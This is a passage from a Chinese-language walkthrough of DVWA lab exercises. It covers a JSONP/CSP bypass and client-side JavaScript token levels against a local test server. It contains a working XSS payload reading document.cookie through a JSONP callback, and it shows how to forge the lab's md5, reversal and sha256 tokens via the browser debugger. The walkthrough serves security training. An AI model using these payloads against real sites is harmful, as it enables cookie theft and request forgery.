将结果输出到 网页当中，完整的流程是这样，比较繁琐和复杂。

这个时候如果将 callback 参数换成：





payload

```payload
jsonp.php?callback=alert(document.cookie)
```

就会得到如下返回值：



![img](https://image.3001.net/images/20200528/15906554928084.png)



此时 JS 调用执行的话就会触发弹窗。

但是怎么去修改 callback 参数呢？幸运的是这一关留了一手：





php

```php
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
```

POST 提交的 include 参数直接放到了 body 源码中，这里我们可以自己改造 include 来进行弹窗：





javascript

```javascript
include=<script src=source/jsonp.php?callback=alert(document.cookie)></script>
```



![img](https://image.3001.net/images/20200528/15906555467213.png)



成功注入 XSS

## Impossible

这里主要是下面文件发生了改动：jsonp_impossible.php：





php

```php
<?php
header("Content-Type: application/json; charset=UTF-8");

$outp = array ("answer" => "15");

echo "solveSum (".json_encode($outp).")";
?>
```

这里指定了只能输出 solveSum：





php

```php
echo "solveSum (".json_encode($outp).")";
```

这意味着只能回调 JS 里面的 solveSum 函数：





javascript

```javascript
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}
```

不过在实际的生产环境中，这种 JSONP 写死的还是比较少见的。

# JavaScript Attacks JS 攻击

## Low

Low.php





javascript

```javascript
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
```

主要生成了一个 token 通过 JS 在浏览器前端生成。

再查看 index.php 的源码：





php

```php
$message = "";
// Check whwat was sent in to see if it was what was expected
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (array_key_exists ("phrase", $_POST) && array_key_exists ("token", $_POST)) {

        $phrase = $_POST['phrase'];
        $token = $_POST['token'];

        if ($phrase == "success") {
            switch( $_COOKIE[ 'security' ] ) {
                case 'low':
                    if ($token == md5(str_rot13("success"))) {
                        $message = "<p style='color:red'>Well done!</p>";
                    } else {
                        $message = "<p>Invalid token.</p>";
                    }
```

`$phrase` 和 `$token` 均从用户的 POST 方式获取，然后如果 `if ($phrase == "success")` 且 token 正确的话，就输出 Well done! 成功

现在 success 这个我们很容易控制，关键还是得看 token：



![img](https://image.3001.net/images/20200528/15906571899945.png)



直接输入的话就会提示 token 无效，抓取提交的数据包内容如下：





http

```http
POST /vulnerabilities/javascript/ HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:8888/vulnerabilities/javascript/
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low
Connection: close
Upgrade-Insecure-Requests: 1

token=8b479aefbd90795395b3e7089ae0dc09&phrase=success&send=Submit
```

浏览器下断点，审查元素发现：



![img](https://image.3001.net/images/20200528/1590660465293.png)



生成的这个 Token 实际上：





javascript

```javascript
md5(rot13(ChangeMe))
```

然后写入到 form 表单中：





html

```html
<form name="low_js" method="post">
        <input type="hidden" name="token" value="8b479aefbd90795395b3e7089ae0dc09" id="token">
        <label for="phrase">Phrase</label> <input type="text" name="phrase" value="ChangeMe" id="phrase">
        <input type="submit" id="send" name="send" value="Submit">
</form>
```

当我们提交这个表单，token 和 phrase 就会提交，但是这里的 token 是错误的，所以这里我们得把 ChangeMe 换成 success 才可以 拿到正确的 token

这里得通过 Chrome 浏览器进行调试：



![img](https://image.3001.net/images/20200528/15906613644689.png)



然后右侧的面板里面手动修改 phrase 的值为 success 然后点击左面 Paused in debugger 的 放行按钮。

此时再查看 Elements 元素，定位到表单，会发现 token 已经更改成功了：



![img](https://image.3001.net/images/20200528/15906614669683.png)



拿到的 token 重新提交 token 和 phrase 吧：





none

```none
token=38581812b435834ebf84ebcc2c6424d6&phrase=success&send=Submit
```



![img](https://image.3001.net/images/20200528/1590661568506.png)



或者直接在 console 里面输入：





javascript

```javascript
md5(rot13("success"));
```



![img](https://image.3001.net/images/20200528/15906672956536.png)



也是可行的。

## Medium

medium.php 源码如下：





php

```php
<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/medium.js"></script>
EOF;
?>
```

跟进 medium.js





javascript

```javascript
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```

这里比较容易理解，将 phrase 逆序输出，然后在前后分别添加 `XX` 作为规律，默认的 ChangeMe 的 token 如下：





html

```html
<input type="hidden" name="token" value="XXeMegnahCXX" id="token">
```

所以当我们输入 success 的话，对应的 token 应该就是 `XXsseccusXX`

直接通过提交看看：





payload

```payload
token=XXsseccusXX&phrase=success&send=Submit
```



![img](https://image.3001.net/images/20200528/15906626758201.png)



这里我们直接发现 token 规律了，这种好事当然不常见，实战中我们一般还是使用 Chrome 浏览器进行调试，传入我们想要的值，和之前的审查元素类似，只是这里调试的是 medium.js 依然可以正常下断点然后修改值，调试完成放行之后，审查元素会发现正确的 token 已经出现：



![img](https://image.3001.net/images/20200528/15906629034373.png)



## High

high.php 源码如下：





php

```php
<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/high.js"></script>
EOF;
?>
```

跟进 high.js 会发现代码明显被混淆了，这个在实战中也经常遇到，使用在线工具进行解码：[Deobfuscate Javascript - Deobfuscate malicious Javascripts for quick and easy analysis](http://deobfuscatejavascript.com/#)

重点看解密后的下面代码：





javascript

```javascript
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

> 实际上 DVWA 源码里面也提供了解密后的代码 high_unobfuscated.js

几个函数调用顺序及生成token的步骤如下：

首先将 phrase 的值初始化为 空，这里是关键 后面我们需要把这里直接 console 设置为 success





javascript

```javascript
document.getElementById("phrase").value = "";
```

然后执行：





javascript

```javascript
token_part_1("ABCD", 44);
```

代码如下：





javascript

```javascript
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
```

此时会调用 do_something 函数：





javascript

```javascript
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
```

do_something 负责将 e 参数进行逆序。

延迟 300ms 后会自动 执行：





javascript

```javascript
token_part_2("XX")
```

主要功能如下：





javascript

```javascript
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
```

即生成 XX 的 sha256 值 然后复制给 token：





payload

```payload
ecc76c19c9f3c5108773d6c3a18a6c25c9bf1131c4e250b71213274e3b2b5d08
```

接着当我们点击提交的时候，就会触发 click 事件：





javascript

```javascript
document.getElementById("send").addEventListener("click", token_part_3);
```

然后调用 token_part_3 函数：





javascript

```javascript
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
```

此时的 token 和 y 我们都有了，就可与推算出现在的 token 情况：

下面是 token 的变化过程：



![img](https://image.3001.net/images/20200528/15906684858439.png)



整个代码的流程演示完了，我们很容易发现问题出在这个地方：





javascript

```javascript
document.getElementById("phrase").value = "";
```

我们输入的 success 并没有传进函数中执行。下面来开始进行调试吧：

首先选中 右侧的 mouse 监听 click 事件，此时浏览器就会自动解码 JS，然后在 token_part_1 下断点：



![img](https://image.3001.net/images/20200528/15906689669292.png)



此时取消 mouse 的 clik，重新刷新页面，即下面的效果：



![img](https://image.3001.net/images/20200528/15906691113471.png)



然后去 控制台 里面设置 phrase 的值：





javascript

```javascript
document.getElementById("phrase").value = "success";
```

直接放行 就会直接成功了：



![img](https://image.3001.net/images/20200528/159066921846.png)



第一遍可能没有成功，缓存了之前操作，一般来说 第二次就会成功。

## Impossible

You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.

这个级别有点幽默，防护的方法就是直接删掉了用户可以输入的地方，类似于国内 HW 直接把服务关的操作一样，学到了，学到了…